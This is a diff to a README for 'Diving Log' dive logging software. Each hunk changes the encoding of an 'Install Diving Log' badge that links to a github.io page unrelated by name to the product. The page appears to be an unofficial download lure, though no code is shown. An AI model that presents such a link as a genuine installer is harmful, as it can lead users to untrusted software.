@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving%20Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving+Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Diving Log is a comprehensive scuba dive logging software for Windows, Android, 
 
 <div align="center">
 
-[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving%20Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving+Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Diving Log is a comprehensive scuba dive logging software for Windows, Android, 
 
 <div align="center">
 
-[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving%20Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Diving Log](https://img.shields.io/badge/⬇_Install_Diving+Log-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
